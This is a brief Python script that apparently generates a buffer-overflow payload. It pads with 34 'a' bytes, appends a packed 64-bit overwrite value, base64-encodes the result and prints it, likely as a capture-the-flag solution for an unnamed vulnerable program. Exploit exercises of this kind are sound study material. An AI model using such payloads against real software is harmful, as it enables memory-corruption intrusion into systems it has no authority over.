
import sys
import struct
import base64

buf = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
buf += struct.pack('<Q', 11908283247320073797)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
